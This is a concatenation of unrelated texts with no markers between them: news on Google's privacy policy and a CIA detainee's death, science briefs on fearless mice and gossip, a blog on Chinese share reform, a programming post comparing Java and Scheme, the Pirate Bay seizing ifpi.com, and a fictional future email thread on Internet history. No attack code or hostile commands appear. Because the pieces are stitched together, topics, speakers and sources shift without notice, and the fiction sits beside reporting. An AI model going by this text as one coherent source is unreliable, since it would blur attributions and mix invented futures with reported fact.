A working party of European Information Commissioners has written to Google to ask the firm to explain why it holds on to users ' web history data for up to two years .
Google has said it would respond by the end of June .
There is also growing concern from privacy campaigners over the implication of Google 's proposed purchase of advertising firm DoubleClick .
The ad company helps link up advertising agencies , marketers and web site publishers hoping to put adverts online .
Campaigners argue that the two firms will have an unprecedented amount of information on users ' web - surfing habits .
In an interview with the BBC News website , Mr Fleischer said : " The general principle is that we are going to maintain the privacy of our users ; that is pretty fundamental .
There are some very limited circumstances in which we would share user data with third parties
Peter Fleischer
" We will never transfer to third parties , including advertisers , any personally identifiable information about our users .
" Our goal is to be as transparent as possible with our users when it comes to privacy .
That transparency builds trust and we will succeed or fail on whether our users trust us . "
Mr Fleischer said its privacy policy was written to be as " clear and simple as possible " .
But he admitted two elements of the policy statement needed attention .
Those elements stated :
When we use third parties to assist us in processing your personal information , we require that they comply with our Privacy Policy and any other appropriate confidentiality and security measures .
We may also share information with third parties in limited circumstances , including when complying with legal process , preventing fraud or imminent harm , and ensuring the security of our network and services .
" There is a constant process of trying to be clear with language and improve notices , " said Mr Fleischer .
" We ought to be able to do better than that now that you have drawn my attention to that particular clause , " he said , referring to the first clause .
' Outsourcing functions '
After being questioned on the second element , he said : " It is kind of vague .
I wish we could do better on that one . "
Mr Fleischer said Google shared data with third parties when it outsourced a part of its operation .
" The clause essentially says that if we hire outsourcing functions to provide something like virus scanning or security models , we at Google would still be responsible for the privacy practices for our end users . "
He said the clause also covered the movement of data between Google Inc , the US - registered company , and its affiliates , such as Google in the UK .
" There are some very limited circumstances in which we would share user data with third parties .
One of them would be if we were under a legal order from the police to do so .
He added : " Very rarely there will be a case where the police say someone is in actual danger and needs our help .
" We have had a case when someone was kidnapped and Gmail was being used for a hostage ransom demand .
These are incredibly rare situations .
" We are not going to hide behind procedures . "
Mr Fleischer said the company would also share user data with third - party security experts if Google was the subject of a massive hacker attack .
" This is purely hypothetical but we might need to share user data with security experts to find out who is hacking , and where is this coming from . "
In a statement a Google spokesman said : " We write our privacy policy so that it is simple and easy to understand .
" Our users ' privacy is a priority for us , and we 're continually reviewing our privacy policy clauses to make them even more transparent .
We welcome all comments and feedback that helps us with this . "
Did CIA hand over Pearl murder suspect to be tortured nearly to death ?

An alleged terrorist financier who authorities suspected in the plot to kill journalist Daniel Pearl five years ago was detained and interrogated by the CIA and Pakistani intelligence before his death earlier this year , leading human rights groups to suspect the detainee was tortured nearly to death .
The report in Monday 's Wall Street Journal has renewed questions among legal and human rights advocates over how far US interrogators will go to get information from detainees and whether the CIA turns over detainees to other governments that would torture them .
The suspect , Saud Memon , was held for an indeterminate amount of time and interrogated by US and Pakistani intelligence agencies , law enforcement sources tell the Journal 's Jay Solomon and Steve Levine .
Memon was dumped in front of his home in Karachi on April 28 ; the 44 - year - old suspect weighed less than 80 pounds and was badly injured , family members and human - rights activists said .
He was bound to a wheelchair during an appearance before the Pakistani Supreme Court five days later , and Memon was dead within three weeks from what doctors said were complications from meningitis and tuberculosis .
" Legal - aid and human - rights groups have accused Pakistan 's intelligence agency , the Inter - Services Intelligence bureau , of torturing Memon during his detention in Pakistan , based on interviews with fellow prisoners .
A Pakistani police official said Memon was already in poor condition when the U.S. authorities delivered him to Pakistan , " Solomon and Levine report .
A CIA spokesman told the paper that the agency " does not , as a rule , comment on allegations regarding who has , or has not , been in its custody , " but he insisted the US " does not conduct or condone torture . "
Pearl , a foreign correspondent for the Journal , was executed in January 2002 in a brutal videotaped beheading intelligence agencies believe was orchestrated by militant Pakistani terrorists .
" Pakistani investigators called Memon a prime suspect in the case because he owned a nursery compound where the journalist was held and killed .
Witnesses alleged Memon himself drove three men to the compound who subsequently killed Pearl , Pakistani investigators say , " Solomon and Levine report .
Officials said Memon was a significant player among militant groups believed to be conducting abductions in Pakistan .
For months after Pearl 's abduction and execution , Memon disappeared .
Investigators believe he used a fake passport to flee Pakistan for Mozambique , where he traveled to South Africa .
US authorities eventually learned of his whereabouts from the Pakistani government , which intercepted a phone call from Memon to family members .
Amina Masood , a human rights activist , told Solomon and Levine that former inmates imprisoned with Memon said he was extensively tortured by Pakistan 's ISI intelligence agency .
" I saw him with my own eyes .
His body looked like a 16 - year - old boy's .
He had completely lost his memory , " Masood told the paper .
" It was n't possible for him to survive .
He could n't recognize his wife , children . "
A team of University of Tokyo researchers led by professors Hitoshi Sakano and Ko Kobayakawa have announced they have genetically engineered a mouse that does not fear cats , simply by controlling its sense of smell .
By tweaking genes to disable certain functions of the olfactory bulb -- the area of the brain that receives information about smells directly from olfactory receptors in the nose -- the researchers were able to create a " fearless " mouse that does not try to flee when it smells cats , foxes and other predators .
In studying the genetically modified mouse , the researchers have concluded that the evasive behavior exhibited by mammals when they smell predators may be genetically hardwired into the olfactory bulb from birth , and not learned through experience as commonly believed .
The research suggests that the mechanism by which mammals determine whether or not to fear another animal they smell -- and whether or not to flee -- is not a higher - order cerebral function .
Instead , that decision is made based on a lower - order function that is hardwired into the neural circuitry of the olfactory bulb .
However , in other experiments , the researchers demonstrated that mice with impaired olfactory functions can also be taught to fear their predators .
According to Professor Sakano , the research indicates that behavior in the mammalian brain is determined both by instincts coded into the genes and by " associative circuitry " that allows responses to be learned through the environment .
The results of the research , which are to be published in the November 8 online edition of the British science journal Nature , are expected to help scientists better understand the structure of the brain 's neural circuitry responsible for processing information about the outside world .

Researchers , testing students using a computer game , also found gossip played an important role when people make decisions , said Ralf Sommerfeld , an evolutionary biologist at the Max Planck Institute in Germany , who led the study .
" We show that gossip has a strong influence ... even when participants have access to the original information as well as gossip about the same information , " the researchers wrote in the Proceedings of the National Academy of Sciences .
" Thus , it is evident that gossip has a strong manipulative potential . "
In the study , the researchers gave the students money and allowed them to give it to others in a series of rounds .
The students also wrote notes about how others played the game that everyone could review .
Students tended to give less money to people described as " nasty misers " or " scrooges " and more to those depicted as " generous players " or " social players " , Sommerfeld said .
" People only saw the gossip , not the past decisions , " he said in a telephone interview .
" People really reacted on it . "
The researchers then took the game a step further and showed the students the actual decisions people had made .
But they also supplied false gossip that contradicted that evidence .
In these cases , the students based their decisions to award money on the gossip , rather than the hard evidence , showing such information is a powerful tool , Sommerfeld said .
" Rationally if you know what the people did , you should care , but they still listened to what others said , " he said .
" They even reacted on it if they knew better . "
Researchers have long used similar games to study how people cooperate and the impact of gossip in groups .
Scientists define gossip as social information spread about a person who is not present , Sommerfeld said .
In evolutionary terms , gossip can be an important tool for people to acquire information about others ' reputations or navigate through social networks at work and in their everyday lives , the study said .
One example could be using gossip to learn that a potential mate had cheated on others , something which could make that person an undesirable match , Sommerfeld said .

Here Is Why

– By Kunal Jaggi ( References : A Quiet Revolution in China ’s Capital Markets – The McKinsey Quarterly , IPO Indicator – PRnewswire.com )
Everyone ’s been ranting about the 11 % Chinese GDP growth rate , there ’s one angle much of Western media missed out on .
In the 1990 ’s China first began privatizing its state - owned enterprises , in an attempt to use capital market economics to force them to become more commercially focussed .
However , China being China , the government wanted to retain substantial shareholdings and influence , which led to a two - tier ownership structure .
The original equity remained legally distinct from the new equity to form a separate class of shares held by existing state - linked owners .
This class had the same theoretical rights to profits and votes , but could not be sold on public markets .
Two years ago , the government instituted new policies requiring companies to merge the two classes of shareholding to make the nontradable shares liquid .
As of this spring , more than 90 percent of state - owned enterprises had already completed plans to that effect ; shareholders at the last few companies are expected to finalize their reform plans this year .
According to the James Ahn ( partner in McKinsey ’s HKG office ) and David Cogman ( associate principal in the Shanghai office ) , 20 percent of the non-tradable equity is in sectors viewed by the government as strategic .
Around 55 percent is held by strategic investors with long - term interest in the companies .
The remaining 25 percent represents shareholdings by state - owned financial investors .
Out of that , more than 75 percent of the equity ( by value ) is in sectors open to foreign investment .
The following figures give a deeper perspective on the kind of numbers we are talking about here
Non tradable shares as % of total sector capitalization ( At present )
Coal mining – 67 %
Food Mfg – 61 %
Clothing , textile maufacturing – 52 %
Real estate – 47 %
IT – 37 %
Pharma – 255
The two - tier structure dismantling road map estimates that by 2007 end tradable equities will account for 30 % of net market cap , 55 % by 2009 end , 90 % by 2010 end and eventually 100 % .
Click here for the entire graph .
Now , the most immediate thought that comes to mind is that this entire process of converting huge amount of previously un-tradable equity to tradable , flooding the market with more supply than it could absorb , depressing price and diluting shareholder value .
In 2005 , China ’s State Council , the country ’s chief administrative authority , asked SASAC ( State - Owned Assets Supervision and Administration Commission of the State Council – government department created to oversee and supervise listed and unlisted state - owned enterprises ) and China Securities Regulatory Commission ( CSRC – the Chinese equivalent of SEC ) to come up with a definitive plan to end the two - tier equity structure .
Although the companies themselves could determine the specific implementation of the merging of their equity , every plan had to include two key elements .
1 . No more than 5 percent of the previously non-tradable shares could be sold in the first year following the integration and no more than 10 percent in the next year .
Thereafter , companies had the power to specify longer voluntary lockup periods but there were no more regulatory restrictions .
The first wave of companies to pass a reform plan will see their shares become tradable only in late 2007 and early 2008 .
2 . Plans had to involve some compensation paid by the holders of non-tradable shares to the owners of tradable ones .
Many companies approved a proposal of bonus worth 20 percent of the equity stake , possibly combined with cash and options .
3 . Each plan had to gain the support of a two thirds majority of the non-tradable shares and in a separate vote , a two - thirds majority of the tradable shares .
These clauses were put in place to ensure that the initiative would attract enough liquidity to make the price worthwhile .
Now , lets examine some of the potential benefits .
The dismantling of the two - tier equity structure could trigger off a wave of domestic M&A activity ( giving Chinese firms an opportunity to consolidate across the same industry ) and increased opportunities for foreign investors .
It would create a huge pool of equity potentially seeking liquidity – nearly twice the capitilization of the market today .
By the time the last of the non-tradable shares become fully tradable , in 2012 , current plans to reform the pension system and social security , if implemented , will have generated new funds for investment into the equity market .
This increase will greatly enlarge the base of domestic institutional investors , which today account for only 10 percent of all investors .
McKinsey research suggests that from 2005 to 2015 the funds under management of China ’s asset - management industry could grow by as much as 24 percent a year .
A professional , organized investor base would also be a powerful force in advancing best - practice governance .
Can you imagine the rise of Chinese hedge funds ?
A more organized equity market would boost Chinese middle - class investor to gain greater confidence and provide impetus to shift their assets to shares from present low - yielding bank deposit , which now account for almost three - quarters of China ’s financial assets , compared with around 20 percent in the United States .
( according to Diana Farrell and Susan Lund , Putting China ’s Capital to Work : The Value of Financial System Reform , McKinsey Global Institute , May 2006 ) .
This has already been demonstrated by the notable recent increase of chinese middle class investors .
It is no secret that China is producing IPO ’s faster than Paris Hilton gets her pictures taken .
The IPO indicator , reached a new high of 287.8 at the end of July ( 2007 ) , a 13.2 percent increase from June .
Due to exchange controls on China ’s currency , the capital in concentrated within the country .
There is a great demand for investment opportunities of all sort , and domestic stock exchanges would become more attractive for listing .
Already , some high - profile Chinese companies that had scheduled IPOs in Hong Kong have changed their plans , deciding instead to pursue a Shanghai listing .
Aside from currently favorable pricing , this move has considerable public - relations value – attracting further foreign investors .
It can be argued that over time , a healthy , liquid equity market will also take pressure off the banking system .
As companies increasingly look to equity markets instead of bank debt for their capital allocation , an immediate result is usually greater emphasis on profit and corporate efficiency since they are no longer operating in the stodgy state owned banking environment – reducing the risks for both of them in the event of an economic downturn and allow private enterprise to play a greater role in accelerating the consolidation of many industries .
Of course , there are some caveats .
China is still way behind Western standards of accounting , legal and regulatory framework needed to profitable and sustainable equity markets .
There are not enough Chinese - speaking accountants to meet the needs of every listed state - oned enterprise ; accounting firms cannot hire and train people fast enough .
Similarly , there are not enough courts , arbitration procedures , experienced lawyers of high quality .
Lastly , effective market regulation requires independence and objectivity , but in today ’s China no government department truely enjoys them .

Chapter 2 of The Structure and Interpretation of Computer Programs provides an excellent description of how to leverage abstractions to make code more expressive .
One technique it describes is processing data like a signal - processing engineer would precess a signal - by generating the signal , filtering it , translating it with a map , and then combining the elements of the signal with an accumulator .
This enumerate - filter - map - accumulate sequence of operations becomes a pattern that can implement a number of computations in a really understandable way .
The example that the book gives is that of finding the salary of the highest paid programmer , given a collection of employee records .
Here 's how a Java programmer might implement it :
1 2 3 4 5 6 7 8 9 10 int maxSalary = 0 ; for ( Employee employee : employees ) { if ( Role . PROGRAMMER.equals(employee.getRole( ) ) ) { int salary = employee.getSalary ( ) ; if ( salary > maxSalary ) { maxSalary = salary ; } } }
I do n't think this is bad at all .
It 's more or less obvious at a glance what the code is doing .
Let 's take a look at how it can be implemented in Scheme using the enumerate - map - filter - accumulate style :
1 2 3 4 5 6 ( define ( salary - of - highest - paid - programmer records ) ( accumulate max 0 ( map salary ( filter programmer ? records ) ) ) )
If you do n't have any exposure to functional programming , you probably find the first example clearer .
This is a simple example , and most programmers will prefer the one written in the style they 're most familiar with .
I 've spent most of my career programming in Java , but I have had some exposure to functional languages , and I prefer the second example .
I find that it more directly expresses the intent of the code .
At such a small scale , however , it really does n't matter which style you use .
The true power of this technique lies in how it scales to more complex compuations , while still keeping code readable and concise .
Let 's suppose that instead of finding the salary of the highest - paid programmer , we were to generate a report .
That report should contain , for each job title , the maximum salary of any employee with that title , followed by a list of salaries for all employees with that title .
Here 's how I would do it in Scheme :
1 2 3 4 5 6 7 8 9 10 11 12 ( define ( salary - report records ) ( map ( lambda ( want - role ) ( let ( ( salaries ( map salary ( filter ( lambda ( employee ) ( has - role ? want - role employee ) ) records ) ) ) ) ( list want - role ( accumulate max 0 salaries ) salaries ) ) ) ( uniq ( map role records ) ) ) )
And in Java :
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 Map < Role , List < Employee >> employeesByRole = new HashMap < Role , List < Employee >>( ) ; for ( Employee employee : employees ) { Role role = employee.getRole( ) ; if ( !employeesByRole.containsKey( role ) ) { employeesByRole.put ( role , new ArrayList < Employee >( ) ) ; } employeesByRole.get ( role ).add ( employee ) ; } List < List > report = new ArrayList < List >( ) ; for ( Role role : employeesByRole.keySet ( ) ) { Integer maxSalary = 0 ; List < Integer > allSalaries = new ArrayList < Integer >( ) ; for ( Employee employee : employeesByRole.get ( role ) ) { Integer salary = employee.getSalary ( ) ; allSalaries.add ( salary ) ; maxSalary = salary > maxSalary ?
salary : maxSalary ; } List reportEntry = new ArrayList ( ) ; reportEntry.add( role ) ; reportEntry.add(maxSalary ) ; reportEntry.add(allSalaries ) ; report.add( reportEntry ) ; }
Here , the difference should be more apparent .
I far prefer the Scheme version .
The problem with the Java version is not just that it 's more verbose ; it does not express the intent of the code as directly as the Scheme one .
There 's a lot of housekeeping going on with building up the data structures needed to build the report .
The fact that we have two explicit loops clouds the intent of the code .
I hope that at this point you can see how the enumerate - filter - map - accumulate pattern can scale up to more complex calculations .
In those calculations we may be applying that pattern ( or pieces of it ) several times to get the final result , without a loss of clarity in the intent of the code .
A footnote in the aforementioned chapter of The Structure and Interpretation of Computer Programs mentions a study of the Fortran Scientific Subroutine Package that found 90 % of the code fitting into this pattern .
Let 's return to the original example : finding the salary of the highest paid programmer .
Here 's how I would do it in Ruby :
1 2 3 4 5 create_employees .
select { |emp| : programmer == emp.role }. map { |emp| emp.salary }. inject {|m , v| m > v ? m : v}
Is it possible to do this kind of thing in Java ?
This is the closest I could come up with :
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Integer maxSalary = accumulate ( new Accumulation < Integer , Integer >( ) { protected Integer function ( Integer a , Integer b ) { return a > b ? a : b ; }} , map ( new Mapper < Employee , Integer > ( ) { protected Integer function ( Employee emp ) { return emp.getSalary ( ) ; }} , filter ( new Filter < Employee > ( ) { protected boolean function ( Employee emp ) { return Role .
PROGRAMMER.equals(emp.getRole( ) ) ; }} , enumerate ( new Enumeration < Employee > ( ) { protected Collection < Employee > function ( ) { return Arrays.asList( employees ) ; }} ) ) ) , new Integer ( 0 ) ) ;
Yuck .
Since Java does not include a function type , we need to simulate one with anonymous classes .
That creates a lot of syntactic cruft that clouds the code .
People are talking about adding closure support to Java 7 to address this .
How would this code look like if that were added ?
Well , there are currently a couple different proposals out there .
If the BGGA proposal were adopted , I think it would look something like this :
1 2 3 4 5 6 7 8 9 Integer maxSalary = accumulate( { Integer a , Integer b => a > b ? a : b } , 0 , map ( { Employee emp => emp.getSalary ( ) } , filter ( { Employee emp => Role .
PROGRAMMER.equals(emp.getRole( ) ) } , Arrays.asList( employees ) ) ) ) ;
That 's a real improvement .
George Bush held a pep-rally at the White House today and made what was perhaps the most idiotic remark in a long line of idiocies from his misbegotten presidency :
Gold Star Mothers , got you , okay , thank you -- Blue Star Mothers , Gold Star Mothers , all the mothers , yes .
( Applause . )
Every day is Mother 's Day as far as your concerned , is n't it ?
Yes , George , every day is a holiday when you have a child who is either fighting in a war or was killed in it .
The International Federation of the Phonographic Industry has taken up a new battle against pirates , but this one is different than previous legal pursuits .
The UK - based organization acts as the worldwide arm for the music recording industry , but as widely reported , it apparently forgot to renew its .com top - level domain in time before it got snatched up by one of its top targets , The Pirate Bay .
While the IFPI still retains control of ifpi.org , ifpi.com now points to a Pirate Bay page that reads : " International Federation of Pirates Interests . "
The two sides are now preparing for a fight over the domain , and we talked to the parties involved .
Screenshot of the current ifpi.com
The switch came about sometime last week , when Pirate Bay was given the domain by someone who had bought it after it expired some time ago , The Pirate Bay 's Peter Sunde told Ars .
A quick look through Archive.org shows that the " real " IFPI has not been using the domain for some time — in March of this year , the domain was a parked page with a Google search box , and as recently as April , it was being used as a blog for the " free music community . "
An account of the events from IFPI spokesperson Laura Childs appears to confirm this .
" IFPI 's website www.ifpi.org continues to operate as normal .
The web site www.ifpi.com was acquired by a cyber - squatter who appears to have passed it on to an associate of The Pirate Bay , " she told Ars.
" IFPI has already taken legal action to get the domain returned .
We have filed a complaint at the World Intellectual Property Organisation ( WIPO ) under the dispute resolution procedure .
This procedure is designed for classic cyber - squatting cases such as this which involve the use of a URL in bad faith . "
Indeed , the WIPO introduced new dispute resolution procedures in 2002 to account for cybersquatting .
The procedure involves a review by WIPO - appointed , independent panelists in order to enforce ICANN 's Uniform Domain Name Dispute Resolution Policy .
If the panel decides that the domain was acquired or used in bad faith , then it can order the domain to be transferred to the party that registered the complaint .
( For curious readers , a number of past cases and related decisions can be found on WIPO 's website . )
Given WIPO and ICANN 's definition of " bad faith " — which says that the domain cannot be used to cause confusion with the " Complainant 's mark " — there 's a decent chance of The Pirate Bay eventually losing control of the domain .
But if Pirate Bay can fight back and prove somehow that it has no commercial interests or intent to confuse visitors with the " real " IFPI site , it might have a chance at succeeding .
" We have not done anything illegal or even immoral , " Sunde told Ars .
" I can't see why we should n't be able to keep the domain name .
We 're not going to bash IFPI on it , we 're going to host our own IFPI on it , " he said .

Subject : Hello from the Exobiology Lab !
Hi Jonathan !
I just wanted to let you know that I have settled in my new offices at the Exobiology Lab at the Interplanetary Space Exploration Agency 's base here on Mars .
The trip out was uneventful and did let me get through an awful lot of reading in preparation for my three year term here .
There is an excellent library of material here at the lab and reasonable communications back home , thanks to the CommRing satellites that were put up last year here .
The transfer rates are only a few terabits per second , but this is usually adequate for the most part .
We 've been doing some simulation work to test various theories of bio-history on Mars and I have attached the output of one of the more interesting runs .
The results are best viewed with a model VR - 95HR / OS headset with the peripheral glove adapter .
I would recommend finding an outdoor location if you activate the olfactory simulator since some of the outputs are pretty rank !
You 'll notice that atmospheric outgassing seriously interfered with any potential complex life form development .
We tried a few runs to see what would happen if an atmospheric confinement / replenishment system had been in place , but the results are too speculative to be more than entertaining at this point .
There has been some serious discussion of terra - forming options , but the economics are still very unclear , as are the time - frames for realizing any useful results .
I have also been trying out some new exercises to recover from the effects of the long trip out .
I 've attached a sample neuroscan clip which will give you some feeling for the kinds of gymnastics that are possible in this gravity field .
My timing is still pretty lousy , but I hope it will improve with practice .
I 'd appreciate it very much if you could track down the latest NanoConstructor ToolKit from MIT .
I have need of some lab gear which is n't available here and which would be a lot easier to fabricate with the tool kit .
The version I have is NTK - R5 ( 2020 ) and I know there has been a lot added since then .
Therese , I wanted you to see the simulation runs , too .
You may be able to coax better results from the EXAFLOP array at CERN , if you still have an account there .
We 're still limping along with the 50 PFLOP system that Danny Hillis donated to the agency a few years back .
The attached HD video clip shows the greenhouse efforts here to grow grapes from the cuttings that were brought out five years ago .
We 're still a long ways from ' 82 Beaucastel !
Gotta get ready for a sampling trip to Olympus Mons , so will send this off for now .
Warmest regards , David -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Subject : Re : Hello from the Exobiology Lab !
David ,
Many thanks for your note and all its news and interesting data !
Melanie and I are glad to know you are settled now and back at work .
We 've been making heavy use of the new darkside reflector telescope and , thanks to the new petabit fiber links that were introduced last year , we have very effective controls from Luna City .
We 've been able to run some really interesting synthetic aperture observations by linking the results from the darkside array and the Earth - orbiting telescopes , giving us an effective diameter of about 200,000 miles .
I can hardly wait to see what we can make of some of the most distant Quasars with this set - up .
We had quite a scare last month when Melanie complained of a recurring vertigo .
None of the usual treatments seemed to help so a molecular - level brain bioscan was done .
An unexpectedly high level of localized neuro - transmitter synthesis was discovered but has now been corrected by auto - gene therapy .
As you requested , I have attached the latest NanoConstructor ToolKit from MIT .
This version integrates the Knowbot control subsystem which allows the NanoSystem to be fully linked to the Internet for control , data sharing and inter-system communication .
By the way , the Internet Society has negotiated a nice discount for nano - fab services if you need something more elaborate than the ISEA folks have available at XOB .
I could put the NanoSystem on the Solex Mars / Luna run and have it to you pretty quickly .
Keep in touch !

Subject : Re : Hello from the Exobiology Lab !
Bon Jour , David !
I am writing to you from the Hyatt Geosync where your email was forwarded to me from INRIA .
Louis and I are here vacationing for two weeks .
I have some time available and will set up a simulation run on my EXAFLOP account .
They have the VR - 95HR / OS headsets here for entertainment purposes , but they will work fine for examining the results of the simulation .
I have been taking time to do some research on the development of the Interplanetary Internet and have found some rather interesting results .
I guess this counts as a kind of paleo - networking effort , since some of the early days reach back to the 1960s .
It 's hard to believe that anyone even knew what a computer network was back then !
Did you know that the original work on Internet was intended for military network use ?
One would never guess it from the current state of affairs , but a lot of the original packet switching work on ARPANET was done under the sponsorship of something called the Advanced Research Projects Agency of the US Department of Defense back in 1968 .
During the 1970s , a number of packet networks were built by ARPA and others ( including work by the predecessor to INRIA , IRIA , which developed a packet network called CIGALE on which the CYCLADES network operating system was built ) .
There was also work done by the French PTT on an experimental system called RCP that later became a commercial system called TRANSPAC .
Some seminal work was done in the mid-late 1960s in England at the National Physical Laboratory on a single node switch that apparently served as the first local area network !
It 's very hard to believe that this all happened over 50 years ago .
A radio - based network was developed in the same 1960s / early 1970s time period called ALOHANET which featured use of a randomly - shared radio channel .
This idea was later realized on a coaxial cable at XEROX PARC and called Ethernet .
By 1978 , the Internet research effort had produced 4 versions of a set of protocols called " TCP / IP " ( Transmission Control Protocol / Internet Protocol " ) .
These were used in conjunction with devices called gateways , back then , but which became known as " routers " .
The gateways connected packet networks to each other .
The combination of gateways and TCP / IP software was implemented on a lot of different operating systems , especially something called UNIX .
There was enough confidence in the resulting implementations that all the computers on the ARPANET and any networks linked to the ARPANET by gateways were required to switch over to use TCP / IP at the beginning of 1983 .
For many historians , 1983 marks the start of global Internet growth although it had its origins in the research effort started at Stanford University in 1973 , ten years earlier .
I am going to read more about this and , if you are interested , I can report on what happened after 1983 .
I will leave any simulation results from the EXAFLOP runs in the private access directory in the CERN TERAFLEX archive .
It will be accessible using the JIT - ticket I have attached , protected with your public key .

Subject : Internet History Dear
Therese , I am so glad you have had a chance to take a short vacation ; you and Louis work too hard !
I changed the subject line to reflect the new thread this discussion seems to be leading in .
It sounds as if the whole system started pretty small .
How did it ever get to the size it is now ?

Subject : Re : Internet History Hello everyone !
I have been following the discussion with great interest .
I seem to remember that there was an effort to connect what people thought were " super computers " back in the mid-1980's and that had something to do with the way in which the system evolved .
Therese , did your research tell you anything about that ?

Subject : Re : Internet History Jon , Yes , the US National Science Foundation ( NSF ) set up 5 super computer centers around the US and also provided some seed funding for what they called " intermediate level " packet networks which were , in turn , connected to a national backbone network they called " NSFNET . "
The intermediate level nets connected the user community networks ( mostly in research labs and universities at that time ) to the backbone to which the super computer sites were linked .
According to my notes , NSF planned to reduce funding for the various networking activities over time on the presumption that they could become self - sustaining .
Many of the intermediate level networks sought to create a larger market by turning to industry , which NSF permitted .
There was a rapid growth in the equipment market during the last half of the 1980s , for routers ( the new name for gateways ) , work stations , network servers , and local area networks .
The penetration of the equipment market led to a new market in commercial Internet services .
Some of the intermediate networks became commercial services , joining others that were created to meet a growing demand for Internet access .
By mid-1993 , the system had grown to include over 15,000 networks , world - wide , and over 2 million computers .
They must have thought this was a pretty big system , back then .
Actually , it was , at the time , the largest collection of networks and computers ever interconnected .
Looking back from our perspective , though , this sounds like a very modest beginning , does n't it ?
Nobody knew , at the time , just how many users there were , but the system was doubling annually and that attracted a lot of attention in many different quarters .
There was an interesting report produced by the US National Academy of Science about something they called " Collaboratories " which was intended to convey the idea that people and computers could carry out various kinds of collaborative work if they had the right kinds of networks to link their computer systems and the right kinds of applications to deal with distributed applications .
Of course , we take that sort of thing for granted now , but it was new and often complicated 30 years ago .
I am going to try to find out how they dealt with the problem of explosive growth .
Louis and I will be leaving shortly for a three - day excursion to the new vari- grav habitat but I will let you know what I find out about the 1990s period in Internet history when we get back .

Subject : Re : Internet History
Therese , I sent a few Knowbot programs out looking for Internet background and found an interesting archive at the Postel Historical Institute in Pacific Palisades , California .
These folks have an incredible collection of old documents , some of them actually still on paper , dating as far back as 1962 !
This stuff gets addicting after a while .
Postel apparently edited a series of reports called " Request for Comments " or " RFC " for short .
These seem to be one of the principal means by which the technology of the Internet has been documented , and also , as nearly as I can tell , a lot of its culture .
The Institute also has a phenomenal archive of electronic mail going back to about 1970 ( do you believe it ?
Email from over 50 years ago ! ) .
I do n't have time to set up a really good automatic analysis of the contents , but I did leave a couple of Knowbots running to find things related to growth , scaling , and increased capacity of the Internet .
It turns out that the technical committee called the Internet Engineering Task Force was very pre-occupied in the 1991 - 1994 period with the whole problem of accommodating exponential growth in the size of the Internet .
They had a bunch of different options for re- placing the then - existing IP layer with something that could support a larger address space .
There were a lot of arguments about how soon they would run out of addresses and a lot of uncertainty about how much functionality to add on while solving the primary growth problem .
Some folks thought the scaling problem was so critical that it should take priority while others thought there was still some time and that new functionality would help motivate the massive effort needed to replace the then - current version 4 IP .
As it happens , they were able to achieve multiple objectives , as we now know .
They found a way to increase the space for identifying logical end - points in the system as well increasing the address space needed to identify physical end -points .
That gave them a hook on which to base the mobile , dynamic addressing capability that we now rely on so heavily in the Internet .
According to the notes I have seen , they were also experimenting with new kinds of applications that required different kinds of service than the usual " best efforts " they were able to obtain from the conventional router systems .
I found an absolutely hilarious " packet video clip " in one of the archives .
It 's a black - and - white , 6 frame per second shot of some guy taking off his coat , shirt and tie at one of the engineering committee meetings .
His T - shirt says " IP on everything " which must have been some kind of slogan for Internet expansion back then .
Right at the end , some big bearded guy comes up and stuffs some paper money in the other guy 's waistband .
Apparently , there are quite a few other archives of the early packet video squirreled away at the PHI .
I can't believe how primitive all this stuff looks .
I have attached a sample for you to enjoy .
They did n't have TDV back then , so you can't move the point of view around the room or anything .
You just have to watch the figures move jerkily across the screen .
You can dig into this stuff if you send a Knowbot program to concierge@phi.pacpal.ca.us .
This Postel character must have never thrown anything away !!

Subject : Re : Internet History Jon , thanks for the pointer .
I pulled up a lot of very useful material from PHI .
You 're right , they did manage to solve a lot of problems at once with the new IP .
Once they got the bugs out of the prototype implementations , it spread very quickly from the transit service companies outward towards all the host computers in the system .
I also discovered that they were doing research on primitive gigabit - per - second networks at that same general time .
They had been relying on unbelievably slow transmission systems around 100 megabits - per-second and below .
Can you imagine how long it would take to send a typical 3DV image at those glacial speeds ?
According to the notes I found , a lot of the wide - area system was moved over to operate on top of something they called Asynchronous Transfer Mode Cell Switching or ATM for short .
Towards the end of the decade , they managed to get end to end transfer rates on the order of a gigabyte per second which was fairly respectable , given the technology they had at the time .
Of course , the telecommunications business had been turned totally upside down in the process of getting to that point .
It used to be the case that broadcast and cable television , telephone and publishing were different businesses .
In some countries , television and telephone were monopolies operated by the government or operated in the private sector with government regulation .
That started changing drastically as the 1990s unfolded , especially in the United States where telephone companies bought cable companies , publishers owned various communication companies and it got to be very hard to figure out just what kind of company it was that should or could be regulated .
There grew up an amazing number of competing ways to deliver information in digital form .
The same company might offer a variety of information and communication services .
With regard to the Internet , it was possible to reach it through mobile digital radio , satellite , conventional wire line access ( quaintly called " dial - up " ) using Integrated Services Digital Networking , specially - designed modems , special data services on television cable , and new fiber - based services that eventually made it even into residential settings .
All the bulletin board systems got connected to the Internet and surprised everyone , including themselves , when the linkage created a new kind of publishing environment in which authors took direct re- sponsibility for making their work accessible .
Interestingly , this did n't do away either with the need for traditional publishers , who filter and evaluate material prior to publication , nor for a continuing interest in paper and CD - ROM .
As display technology got better and more portable , though , paper became much more of a specialty item .
Most documents were published on - line or on high - density digital storage media .
The basic publishing process retained a heavy emphasis on editorial selection , but the mechanics shifted largely in the direction of the author - with help from experts in layout and accessibility .
Of course , it helped to have a universal reference numbering plan which allowed authors to register documents in permanent archives .
References could be made to these from any other on - line context and the documents retrieved readily , possiblyat some cost for copying rights .
By the end of the decade , " multimedia " was no longer a buzz - word but a normal way of preparing and presenting information .
One unexpected angle : multimedia had been thought to be confined to presentation in visual and audible forms for human consumption , but it turned out that including computers as senders and recipients of these messages allowed them to use the digital email medium as an enabling technology for deferred , inter - computer interaction .
Just based on what I have been reading , one of the toughest technical problems was finding good standards to represent all these different modalities .
Copyright questions , which had been thought to be what they called " show - stoppers , " turned out to be susceptible to largely - established case law .
Abusing access to digital information was impeded in large degree by wrapping publications in software shields , but in the end , abuses were still possible and abusers were prosecuted .
On the policy side , there was a strong need to apply cryptography for authentication and for privacy .
This was a big struggle for many governments , including ours here in France , where there are very strong views and laws on this subject , but ultimately , the need for commonality on a global basis outweighed many of the considerations that inhibited the use of this valuable technology .
Well , that takes us up to about 20 years ago , which still seems a far cry from our current state of technology .
